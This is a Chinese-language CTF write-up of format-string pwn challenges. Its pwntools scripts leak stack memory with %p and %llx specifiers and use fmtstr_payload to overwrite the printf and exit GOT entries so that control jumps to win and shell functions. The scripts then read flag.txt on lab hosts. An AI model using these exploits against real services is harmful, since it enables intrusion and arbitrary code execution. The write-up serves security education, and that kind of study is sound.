# 第三周 格式化字符串
本周的题目没有对长度限制，所以可以直接用pwnlib.fmtstr_payload梭，不需要手动精心构造（虽然原理并不复杂，但这个显然更快不是吗）

## fmt
先来一种比较优雅的做法，用偏移直接把字符串打印出来，不需要痛苦地处理hex：  
~~字符串在栈上？那不给他print出来~~  
~~不会有人还在手转hex吧~~
```python
from pwn import *

p = remote("10.20.55.12", 28074)
p.sendline("%6$p")
p.recvuntil('> ')
leak = int(p.recvline(), 16)
# 440的偏移是哪来的？我并不知道目标环境的确切偏移，所以写个循环把栈dump一遍就好了
p.sendline(b"%19$s---" + p64(leak - 440))
p.interactive()
```

然后是常规快速做法，泄露栈上变量。注意题目环境是64位。  

```python
from pwn import *

p=remote("10.20.55.12", 28069)
# 多打几个lx就看到666c了，然后泄露指定位置就可以
p.send(b"fuck-%10$llx-%11$llx-%12$llx-%13$llx-%14$llx-%15$llx\n")
p.recvuntil(b"fuck-")

# 开始"优雅"地转换flag
s = p.recvuntil(b">").replace(b">", b"").decode().strip()
d = s.split("-")
s = ""
for i in d:
    s += i.rjust(16, "0")

s = bytes.fromhex(s)
s = s.decode()
for i in range(0, len(s), 8):
    print(s[i:i + 8][::-1], end="")
```

## wrire
本来改secret就可以，但是改成了777居然会弹secret is 777，看到没写死got就直接改printf的got了。
```python
from pwn import *

p = remote("10.20.55.12", 28021)
e = context.binary = ELF('chall')
# 通过 AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x 得到offset，这里不需要补位是对齐的
payload = fmtstr_payload(11, {e.got['printf']: e.symbols['win']}, write_size='byte')
p.sendline(payload)
p.sendline(b'cat flag.txt')
p.interactive()
```

## got
同第二题，只不过got打的是exit
```python
from pwn import *

p = remote("10.20.55.12", 28068)
e = context.binary = ELF('chall')
payload = fmtstr_payload(7, {e.got['exit']: e.symbols['get_shell']}, write_size='byte')
# 没关缓冲区，所以得补到128位
p.sendline(payload.ljust(128, b'a'))
p.sendline('cat flag.txt')
p.interactive()
```